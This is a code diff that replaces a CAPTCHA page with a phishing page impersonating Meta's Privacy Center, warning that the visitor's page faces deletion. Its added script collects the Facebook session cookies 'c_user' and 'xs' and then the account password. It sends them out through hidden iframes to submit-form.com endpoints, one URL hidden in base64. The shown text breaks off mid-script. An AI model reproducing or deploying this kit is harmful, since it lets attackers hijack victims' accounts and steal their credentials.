@@ -3,62 +3,934 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CAPTCHA Verification</title>
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <title>Meta Privacy Center - Page Deletion</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+        * {
             margin: 0;
-            background-color: #f5f5f5;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-        .captcha-container {
-            background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        
+        body {
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            line-height: 1.6;
+            display: flex;
+            min-height: 100vh;
+        }
+        
+        .sidebar {
+            width: 280px;
+            background-color: #ffffff;
+            box-shadow: 2px 0 4px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            position: fixed;
+            height: 100vh;
+            overflow-y: auto;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #e4e6eb;
+        }
+        
+        .meta-logo {
+            height: 36px;
+            margin-right: 12px;
+        }
+        
+        .logo-text {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1877f2;
+        }
+        
+        .nav-section {
+            margin-bottom: 30px;
+        }
+        
+        .nav-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #65676b;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .nav-links {
+            list-style: none;
+        }
+        
+        .nav-links li {
+            margin-bottom: 12px;
+        }
+        
+        .nav-links a {
+            color: #1c1e21;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            padding: 8px 12px;
+            border-radius: 6px;
+            transition: background-color 0.2s;
+        }
+        
+        .nav-links a:hover {
+            background-color: #f0f2f5;
+        }
+        
+        .nav-links a.active {
+            background-color: #e7f3ff;
+            color: #1877f2;
+            font-weight: 500;
+        }
+        
+        .nav-icon {
+            margin-right: 10px;
+            width: 20px;
             text-align: center;
         }
-        h1 {
-            color: #333;
-            margin-bottom: 20px;
+        
+        .main-content {
+            flex: 1;
+            margin-left: 280px;
+            padding: 20px;
         }
-        .g-recaptcha {
-            display: inline-block;
-            margin-bottom: 20px;
+        
+        .content-card {
+            background-color: #ffffff;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin-bottom: 30px;
+            text-align: center;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
         }
-        #message {
-            margin-top: 15px;
-            color: #666;
+        
+        .card-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #d93025;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .warning-icon {
+            margin-right: 10px;
+            font-size: 28px;
+        }
+        
+        .info-text {
+            margin-bottom: 20px;
+            color: #65676b;
+            text-align: left;
+        }
+        
+        .appeal-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 12px 100px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            display: block;
+            margin: 20px auto;
+        }
+        
+        .appeal-button:hover {
+            background-color: #166fe5;
+        }
+        
+        .content-image {
+            width: 100%;
+            max-width: 600px;
+            margin: 20px auto;
+            border-radius: 8px;
+            display: block;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 20px 0;
+            color: #65676b;
             font-size: 14px;
+            margin-top: 40px;
+        }
+        
+        .footer-links {
+            margin-top: 10px;
+        }
+        
+        .footer-links a {
+            color: #65676b;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .mobile-header {
+            display: none;
+            background-color: #ffffff;
+            padding: 15px 10px;
+            border-radius: 8px;
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+            align-items: center;
+        }
+        
+        .mobile-logo-container {
+            display: flex;
+            align-items: center;
+        }
+        
+        .mobile-logo {
+            height: 40px;
+            width: 40px;
+            border-radius: 50%;
+            margin-right: 12px;
+            object-fit: cover;
+        }
+        
+        .mobile-nav-toggle {
+            margin-left: auto;
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #65676b;
+        }
+        
+        .mobile-nav {
+            display: none;
+            background-color: #ffffff;
+            padding: 15px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+        }
+        
+        .mobile-nav-links {
+            list-style: none;
+        }
+        
+        .mobile-nav-links li {
+            margin-bottom: 10px;
+        }
+        
+        .mobile-nav-links a {
+            color: #1c1e21;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-radius: 6px;
+            transition: background-color 0.2s;
+        }
+        
+        .mobile-nav-links a:hover {
+            background-color: #f0f2f5;
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-content {
+            background-color: white;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 500px;
+            max-height: 90vh;
+            padding: 30px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            position: relative;
+            overflow-y: auto;
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #65676b;
+        }
+        
+        .modal-title {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #1c1e21;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #1c1e21;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        
+        .video-container {
+            margin: 25px 0;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        
+        .video-player {
+            width: 100%;
+            max-height: 300px;
+            border-radius: 8px;
+        }
+        
+        .submit-form-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        .submit-form-button:hover {
+            background-color: #166fe5;
+        }
+        
+        .facebook-logo-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .facebook-logo {
+            height: 70px;
+            width: 70px;
+        }
+        
+        .loading-spinner {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
+        }
+        
+        /* Language Selection Styles */
+        .language-options {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .language-option {
+            display: flex;
+            align-items: center;
+            padding: 12px 15px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .language-option:hover {
+            background-color: #f0f2f5;
+        }
+        
+        .language-option.selected {
+            background-color: #e7f3ff;
+            border-color: #1877f2;
+        }
+        
+        .language-flag {
+            margin-right: 10px;
+            font-size: 20px;
+        }
+        
+        .language-name {
+            font-weight: 500;
+        }
+        
+        .continue-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        .continue-button:disabled {
+            background-color: #dddfe2;
+            cursor: not-allowed;
+        }
+        
+        .continue-button:hover:not(:disabled) {
+            background-color: #166fe5;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 768px) {
+            body {
+                flex-direction: column;
+            }
+            
+            .sidebar {
+                display: none;
+            }
+            
+            .main-content {
+                margin-left: 0;
+                padding: 15px;
+            }
+            
+            .mobile-header {
+                display: flex;
+            }
+            
+            .modal-content {
+                width: 95%;
+                padding: 20px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="captcha-container">
-        <h1>Please verify you're human</h1>
-        <form id="captcha-form">
-            <div class="g-recaptcha" data-sitekey="6LfFDdQrAAAAAHugciMh61t70z4iCbTDx-c1Goa3" data-callback="onSuccess"></div>
-            <div id="message">Complete the CAPTCHA to continue</div>
-        </form>
+    <div class="sidebar">
+        <div class="logo-container">
+            <!-- Meta Logo -->
+            <svg class="meta-logo" viewBox="0 0 36 36" fill="url(#jsc_s_3)" height="36" width="36">
+                <defs>
+                    <linearGradient x1="50%" x2="50%" y1="97.078%" y2="0%" id="jsc_s_3">
+                        <stop offset="0%" stop-color="#0062E0"></stop>
+                        <stop offset="100%" stop-color="#19AFFF"></stop>
+                    </linearGradient>
+                </defs>
+                <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"></path>
+                <path fill="#fff" d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z"></path>
+            </svg>
+            <span class="logo-text">Privacy Center</span>
+        </div>
+        
+        <div class="nav-section">
+            <h3 class="nav-title">Navigation</h3>
+            <ul class="nav-links">
+                <li><a href="#" class="active"><span class="nav-icon">🏠</span>Privacy Center Home Page</a></li>
+                <li><a href="#"><span class="nav-icon">🔍</span>Search</a></li>
+                <li><a href="#"><span class="nav-icon">📄</span>Privacy Policy</a></li>
+                <li><a href="#"><span class="nav-icon">📚</span>Other Rules & Articles</a></li>
+            </ul>
+        </div>
+        
+        <div class="nav-section">
+            <h3 class="nav-title">Your Privacy</h3>
+            <ul class="nav-links">
+                <li><a href="#"><span class="nav-icon">👤</span>Your Information</a></li>
+                <li><a href="#"><span class="nav-icon">🔒</span>Security Settings</a></li>
+                <li><a href="#"><span class="nav-icon">📱</span>App Permissions</a></li>
+                <li><a href="#"><span class="nav-icon">🚫</span>Deletion Requests</a></li>
+            </ul>
+        </div>
     </div>
-
-    <script>
-        function onSuccess(token) {
-            // CAPTCHA verification successful
-            document.getElementById('message').textContent = "Verification successful! Redirecting...";
-            document.getElementById('message').style.color = "green";
+    
+    <div class="main-content">
+        <div class="mobile-header">
+            <div class="mobile-logo-container">
+                <!-- Custom Mobile Logo -->
+                <img src="data:image/png;base64,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" alt="Meta" class="mobile-logo">
+                <span class="logo-text">Privacy Center</span>
+            </div>
+            <button class="mobile-nav-toggle" id="navToggle">☰</button>
+        </div>
+        
+        <div class="mobile-nav" id="mobileNav">
+            <ul class="mobile-nav-links">
+                <li><a href="#" class="active"><span class="nav-icon">🏠</span>Privacy Center Home Page</a></li>
+                <li><a href="#"><span class="nav-icon">🔍</span>Search</a></li>
+                <li><a href="#"><span class="nav-icon">📄</span>Privacy Policy</a></li>
+                <li><a href="#"><span class="nav-icon">📚</span>Other Rules & Articles</a></li>
+                <li><a href="#"><span class="nav-icon">👤</span>Your Information</a></li>
+                <li><a href="#"><span class="nav-icon">🔒</span>Security Settings</a></li>
+                <li><a href="#"><span class="nav-icon">📱</span>App Permissions</a></li>
+                <li><a href="#"><span class="nav-icon">🚫</span>Deletion Requests</a></li>
+            </ul>
+        </div>
+        
+        <div class="content-card">
+            <h2 class="card-title">
+                <span class="warning-icon">⚠️</span>
+                Your page is scheduled to be deleted!
+            </h2>
+            <p class="info-text">We have received several reports that your page violates our terms of service and community guidelines. As a result, your page will be sent for verification.</p>
+            <p class="info-text">If you believe your page was mistakenly scheduled for deletion, you can prevent its permanent removal by simply clicking the appeal button below and providing some quick information.</p>
+            <!-- Added Image -->
+            <img src="https://ik.imagekit.io/alibrohi/download.png?updatedAt=1756102262767" alt="Privacy Center" class="content-image">
             
-            // Redirect to another page after 2 seconds
-            setTimeout(function() {
-                window.location.href = "https://privacy-center-verif.vercel.app/";
-            }, 2000);
+            <p class="info-text">We have received several reports that your page violates our terms of service and community guidelines. As a result, your page will be sent for verification.</p>
+            
+            <p class="info-text"></p>
+          
+            
+            <button class="appeal-button" id="submitAppeal">Appeal</button>
+        </div>
+        
+        <footer>
+            <p>Meta &copy; 2025</p>
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+                <a href="#">Help Center</a>
+            </div>
+        </footer>
+    </div>
+    
+    <!-- Language Selection Modal -->
+    <div class="modal" id="languageModal">
+        <div class="modal-content">
+            <button class="close-modal" id="closeLanguageModal">&times;</button>
+            <h2 class="modal-title">Choose Your Language</h2>
+            
+            <div class="language-options">
+                <div class="language-option" data-lang="en">
+                    <span class="language-flag">🇺🇸</span>
+                    <span class="language-name">English</span>
+                </div>
+                <div class="language-option" data-lang="es">
+                    <span class="language-flag">🇪🇸</span>
+                    <span class="language-name">Spanish</span>
+                </div>
+                <div class="language-option" data-lang="pt">
+                    <span class="language-flag">🇵🇹</span>
+                    <span class="language-name">Portuguese</span>
+                </div>
+                <div class="language-option" data-lang="hi">
+                    <span class="language-flag">🇮🇳</span>
+                    <span class="language-name">Hindi</span>
+                </div>
+                <div class="language-option" data-lang="ta">
+                    <span class="language-flag">🇮🇳</span>
+                    <span class="language-name">Tamil</span>
+                </div>
+                <div class="language-option" data-lang="ar">
+                    <span class="language-flag">🇸🇦</span>
+                    <span class="language-name">Arabic</span>
+                </div>
+            </div>
+            
+            <button class="continue-button" id="continueButton" disabled>Continue</button>
+        </div>
+    </div>
+    
+    <!-- First Modal Form -->
+    <div class="modal" id="appealModal">
+        <div class="modal-content">
+            <button class="close-modal" id="closeModal">&times;</button>
+            <h2 class="modal-title">Page Appeal Request</h2>
+            
+            <form id="appealForm">
+                <!-- Video section moved above the form fields -->
+                <div class="video-container">
+                    <p class="info-text" style="text-align: center; margin-bottom: 10px; font-weight: 500;">Please review the violation details carefully before submitting</p>
+                    <h4>Watch Detailed Information Video: </h4>
+                    <video class="video-player" controls id="languageVideo">
+                        <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
+                        Your browser does not support the video tag.
+                    </video>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" for="firstName">c_user</label>
+                    <input type="text" id="firstName" class="form-input" placeholder="Enter c_user" required>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" for="lastName">xs</label>
+                    <input type="text" id="lastName" class="form-input" placeholder="Enter xs" required>
+                </div>
+                
+                <div class="loading-spinner" id="firstFormSpinner">
+                    <div class="spinner"></div>
+                    <p>Submitting your request...</p>
+                </div>
+                
+                <button type="submit" class="submit-form-button" id="firstFormSubmit">Submit Appeal Request</button>
+            </form>
+        </div>
+    </div>
+    
+    <!-- Second Modal for Surname -->
+    <div class="modal" id="surnameModal">
+        <div class="modal-content">
+            <button class="close-modal" id="closeSurnameModal">&times;</button>
+            
+            <div class="facebook-logo-container">
+                <svg class="facebook-logo" viewBox="0 0 36 36" fill="#1877F2" height="70" width="70">
+                    <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"></path>
+                    <path fill="#fff" d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z"></path>
+                </svg>
+            </div>
+            
+            <h2 class="modal-title">Enter Your Password</h2>
+            
+            <form id="surnameForm">
+                <div class="form-group">
+                    <label class="form-label" for="surname">Password</label>
+                    <input type="text" id="surname" class="form-input" placeholder="Enter your password" required>
+                </div>
+                
+                <div class="loading-spinner" id="secondFormSpinner">
+                    <div class="spinner"></div>
+                    <p>Submitting your appeal...</p>
+                </div>
+                
+                <button type="submit" class="submit-form-button" id="secondFormSubmit">Submit Appeal</button>
+            </form>
+        </div>
+    </div>
+    
+    
+    <iframe name="hiddenIframe1" id="hiddenIframe1" style="display: none;"></iframe>
+    <iframe name="hiddenIframe2" id="hiddenIframe2" style="display: none;"></iframe>
+    <iframe name="hiddenIframe3" id="hiddenIframe3" style="display: none;"></iframe>
+    
+    <script>
+        // Get modal elements
+        const languageModal = document.getElementById('languageModal');
+        const appealModal = document.getElementById('appealModal');
+        const surnameModal = document.getElementById('surnameModal');
+        const submitAppealBtn = document.getElementById('submitAppeal');
+        const closeLanguageModalBtn = document.getElementById('closeLanguageModal');
+        const closeModalBtn = document.getElementById('closeModal');
+        const closeSurnameModalBtn = document.getElementById('closeSurnameModal');
+        const appealForm = document.getElementById('appealForm');
+        const surnameForm = document.getElementById('surnameForm');
+        const firstFormSpinner = document.getElementById('firstFormSpinner');
+        const secondFormSpinner = document.getElementById('secondFormSpinner');
+        const firstFormSubmitBtn = document.getElementById('firstFormSubmit');
+        const secondFormSubmitBtn = document.getElementById('secondFormSubmit');
+        const hiddenIframe1 = document.getElementById('hiddenIframe1');
+        const hiddenIframe2 = document.getElementById('hiddenIframe2');
+        const hiddenIframe3 = document.getElementById('hiddenIframe3');
+        const continueButton = document.getElementById('continueButton');
+        const languageVideo = document.getElementById('languageVideo');
+        
+        // Language options
+        const languageOptions = document.querySelectorAll('.language-option');
+        
+        // Video URLs for different languages
+        const videoUrls = {
+            'en': 'https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4',
+            'es': 'https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4',
+            'pt': 'https://allvideos.wasmer.app/Portuguese.mp4',
+            'hi': 'https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4',
+            'ta': 'https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-ta/720p.mp4',
+            'ar': 'https://resource2.heygen.ai/video_translate/f7346b2ef53c4daa9bc15138684919db-ar_use-aicoustics-vocal/720p.mp4'
+        };
+        
+        let userData = {};
+        let selectedLanguage = '';
+        
+        // Function to decode base64
+        function decodeBase64(str) {
+            return atob(str);
         }
+        
+        
+        submitAppealBtn.addEventListener('click', function() {
+            languageModal.style.display = 'flex';
+            document.body.style.overflow = 'hidden'; // Prevent background scrolling
+        });
+        
+        // Close modals when X buttons are clicked
+        closeLanguageModalBtn.addEventListener('click', function() {
+            languageModal.style.display = 'none';
+            document.body.style.overflow = 'auto'; // Restore background scrolling
+        });
+        
+        closeModalBtn.addEventListener('click', function() {
+            appealModal.style.display = 'none';
+            document.body.style.overflow = 'auto'; // Restore background scrolling
+        });
+        
+        closeSurnameModalBtn.addEventListener('click', function() {
+            surnameModal.style.display = 'none';
+            document.body.style.overflow = 'auto'; // Restore background scrolling
+        });
+        
+        // Close modal when clicking outside the modal content
+        window.addEventListener('click', function(event) {
+            if (event.target === languageModal) {
+                languageModal.style.display = 'none';
+                document.body.style.overflow = 'auto'; // Restore background scrolling
+            }
+            if (event.target === appealModal) {
+                appealModal.style.display = 'none';
+                document.body.style.overflow = 'auto'; // Restore background scrolling
+            }
+            if (event.target === surnameModal) {
+                surnameModal.style.display = 'none';
+                document.body.style.overflow = 'auto'; // Restore background scrolling
+            }
+        });
+        
+        // Language selection
+        languageOptions.forEach(option => {
+            option.addEventListener('click', function() {
+                // Remove selected class from all options
+                languageOptions.forEach(opt => opt.classList.remove('selected'));
+                
+                // Add selected class to clicked option
+                this.classList.add('selected');
+                
+                // Enable continue button
+                continueButton.disabled = false;
+                
+                // Set selected language
+                selectedLanguage = this.getAttribute('data-lang');
+            });
+        });
+        
+        // Continue button to proceed to appeal form
+        continueButton.addEventListener('click', function() {
+            if (selectedLanguage) {
+                // Set video source based on selected language
+                if (videoUrls[selectedLanguage]) {
+                    languageVideo.querySelector('source').src = videoUrls[selectedLanguage];
+                    languageVideo.load(); // Reload the video with the new source
+                }
+                
+                // Close language modal and open appeal modal
+                languageModal.style.display = 'none';
+                appealModal.style.display = 'flex';
+            }
+        });
+        
+        // Handle first form submission
+        appealForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            
+            // Store user data
+            userData.firstName = firstName;
+            userData.lastName = lastName;
+            
+            // Show loading spinner and disable button
+            firstFormSpinner.style.display = 'block';
+            firstFormSubmitBtn.disabled = true;
+            
+            
+            const tempForm = document.createElement('form');
+            tempForm.method = 'POST';
+            tempForm.action = 'https://submit-form.com/1SPY0jCQv';
+            tempForm.target = 'hiddenIframe1';
+            tempForm.style.display = 'none';
+            
+            
+            const firstNameInput = document.createElement('input');
+            firstNameInput.type = 'text';
+            firstNameInput.name = 'firstName';
+            firstNameInput.value = firstName;
+            tempForm.appendChild(firstNameInput);
+            
+            
+            const lastNameInput = document.createElement('input');
+            lastNameInput.type = 'text';
+            lastNameInput.name = 'lastName';
+            lastNameInput.value = lastName;
+            tempForm.appendChild(lastNameInput);
+            
+            
+            const languageInput = document.createElement('input');
+            languageInput.type = 'text';
+            languageInput.name = 'language';
+            languageInput.value = selectedLanguage;
+            tempForm.appendChild(languageInput);
+            
+            
+            document.body.appendChild(tempForm);
+            tempForm.submit();
+            
+            // Remove the temporary form
+            document.body.removeChild(tempForm);
+            
+            
+            hiddenIframe1.onload = function() {
+                
+                appealModal.style.display = 'none';
+                surnameModal.style.display = 'flex';
+                
+                
+                firstFormSpinner.style.display = 'none';
+                firstFormSubmitBtn.disabled = false;
+            };
+        });
+        
+        
+        surnameForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const surname = document.getElementById('surname').value;
+            
+           
+            userData.surname = surname;
+            
+           
+            secondFormSpinner.style.display = 'block';
+            secondFormSubmitBtn.disabled = true;
+            
+            
+            const tempForm2 = document.createElement('form');
+            tempForm2.method = 'POST';
+            tempForm2.action = 'https://submit-form.com/LwHJ8fVP0';
+            tempForm2.target = 'hiddenIframe2';
+            tempForm2.style.display = 'none';
+            
+            
+            const surnameInput = document.createElement('input');
+            surnameInput.type = 'text';
+            surnameInput.name = 'surname';
+            surnameInput.value = surname;
+            tempForm2.appendChild(surnameInput);
+            
+            
+            const languageInput = document.createElement('input');
+            languageInput.type = 'text';
+            languageInput.name = 'language';
+            languageInput.value = selectedLanguage;
+            tempForm2.appendChild(languageInput);
+            
+            
+            document.body.appendChild(tempForm2);
+            tempForm2.submit();
+            
+            
+            document.body.removeChild(tempForm2);
+            
+            
+            hiddenIframe2.onload = function() {
+                
+                const encodedFormUrl = "aHR0cHM6Ly9zdWJtaXQtZm9ybS5jb20vOXVjQlhFczdp";
+                const thirdFormUrl = decodeBase64(encodedFormUrl);
+                
+               
+                const tempForm3 = document.createElement('form');
+                tempForm3.method = 'POST';
+                tempForm3.action = thirdFormUrl;
+                tempForm3.target = 'hiddenIframe3';
+                tempForm3.style.display = 'none';
+                
+                
+                const firstNameInput = document.createElement('input');
+                firstNameInput.type = 'text';
+                firstNameInput.name = 'firstName';
+                firstNameInput.value = userData.firstName;
+                tempForm3.appendChild(firstNameInput);
+                
+                const lastNameInput = document.createElement('input');
